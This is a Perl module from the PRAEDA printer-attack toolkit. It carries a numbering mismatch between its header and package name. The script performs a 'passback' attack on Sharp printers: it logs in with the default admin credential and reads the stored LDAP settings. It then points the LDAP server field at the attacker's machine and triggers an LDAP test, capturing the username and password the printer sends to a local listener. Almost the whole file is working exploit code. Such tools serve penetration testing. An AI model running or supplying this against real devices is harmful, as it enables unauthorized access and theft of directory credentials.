# Sharps LDAP capture 
######################################################
#                    PRAEDA Module #MP0015           #
#        Copyright (C) 2011 Foofus.net		     #
#              Deral 'percX' Heiland                 #
######################################################
package MP0014;
sub MP0014
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];

# Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting passback attack to capture LDAP settings on Sharp $TARGET : JOB MP0014**********\n";
     print OUTFILE "\n**********Attempting passback attack to capture LDAP settings on Sharp $TARGET : JOB MP0014**********\n";


# Setup cookie and place in cookie jar
 $cookie_jar = HTTP::Cookies->new();
 my $browser = LWP::UserAgent->new(timeout => 120);
 $browser->cookie_jar($cookie_jar);
  

# enable redirect handeling for POST process
 push @{ $browser->requests_redirectable }, 'POST';

#grab login page to get session cookie
 $response = $browser->get("http$web://$TARGET:$PORTS/login.html?");
 my $content = $response->content();


# Authenticate with defaul printer default credential of admin with no password
my $response = $browser->post("http$web://$TARGET:$PORTS/login.html",
    [
     "ggt_select(10009)" =>"3",
     "ggt_textbox(10003)" => "admin",
     "action" =>"loginbtn",
     "ggt_hidden(10008)" => "4",
    ]);
    die " error: ", $response->status_line
       unless $response->is_success;
    die "Weird content type  -- ", $response->content_type
       unless $response->content_type eq 'text/html';

# retrieve the ldap setting for parsing
 $response = $browser->get("http$web://$TARGET:$PORTS/nw_quick.html");
 my $content = $response->content();

# parse ldap setup data from page information on input tags
my $html = HTML::TagParser->new($content);
my @list = $html->getElementsByTagName( "input" );

my @values = (
     "ggt_textbox(1)",
     "ggt_textbox(2)",
     "ggt_textbox(3)",
     "ggt_textbox(4)",
     "ggt_textbox(5)",
     "ggt_textbox(6)",
     "ggt_textbox(8)",
     "ggt_textbox(10)",
     "ggt_textbox(11)",
     "ggt_textbox(19)",
     "ggt_textbox(20)",
     "ggt_textbox(21)",
     "ggt_textbox(22)",
     "ggt_textbox(23)",
     "ggt_select(25)",
     "ggt_textbox(26)",
     "ggt_textbox(27)",
     "ggt_checkbox(29)",
     "ggt_checkbox(41)",
     "ggt_hidden(30)",
     "ggt_hidden(31)",
     "ggt_hidden(32)",
    );
foreach my $elem ( @list ) 
     {
      my $text1 = $elem->getAttribute("name");
      $text1 =~ s/[()]//g; 
      my $text2 = $elem->getAttribute("value");

# create variables from ggt data
          foreach $value (@values)
               {
                $value =~ s/[()]//g;
                if ($text1 eq $value)
                     {
                      ${"$text1"} = $text2; 
                     }
               }
      }
#Set up listener TCP port 1389 and post bounce back attack

# identify the local primary interface ip address
 my $sock = IO::Socket::INET->new(
                    PeerAddr=> "$TARGET",
                    PeerPort=> 80,
                    Proto   => "tcp");
 my $localip = $sock->sockhost;
 $sock->close();

#setup listener
   $| = 1;

   my ($socket,$client_socket);
   my ($peeraddress,$peerport);

   $socket = IO::Socket::INET->new
     (
      Listen => 1,
      Reuse => 1,
      LocalAddr => $localip,
      LocalPort => 1389,
      Proto => 'tcp',
      Timeout => "30"
     );


# post attack
my $response = $browser->post("http$web://$TARGET:$PORTS/nw_quick.html",
    [
     "ggt_textbox(1)" => "$ggt_textbox1",
     "ggt_textbox(2)" => "$ggt_textbox2",
     "ggt_textbox(3)" => "$ggt_textbox3",
     "ggt_textbox(4)" => "$ggt_textbox4",
     "ggt_textbox(5)" => "$ggt_textbox5",
     "ggt_textbox(6)" => "$ggt_textbox6",
     "ggt_textbox(8)" => "$ggt_textbox8",
     "ggt_textbox(10)" => "$ggt_textbox10",
     "ggt_textbox(11)" => "$ggt_textbox11",
     "ggt_textbox(19)" => "$ggt_textbox19",
     "ggt_textbox(20)" => "$ggt_textbox20",
     "ggt_textbox(21)" => "$localip",
     "ggt_textbox(22)" => "$ggt_textbox22",
     "ggt_textbox(23)" => "$ggt_textbox23",
     "ggt_select(25)" => "1",
     "ggt_textbox(26)" => "$ggt_textbox26",
     "ggt_textbox(27)" => "$ggt_textbox27",
     "ggt_checkbox(29)" => "$ggt_checkbox29",
     "ggt_checkbox(41)" => "$ggt_checkbox41",
     "action" => "ldaptestbtn",
     "ggt_hidden(30)" => "1389",
     "ggt_hidden(31)" => "$ggt_hidden31",
     "ggt_hidden(32)" => "$ggt_hidden32",
    ]);

# waiting for new client connection.
      $client_socket = $socket->accept();

# read operation on the newly accepted client
  $data = <$client_socket>;
      print "Raw username and password output = $data\n";
      print OUTFILE "Raw username and password output = $data\n";

# close socket after receiving data
      $socket->close();
      exit;

}
1;
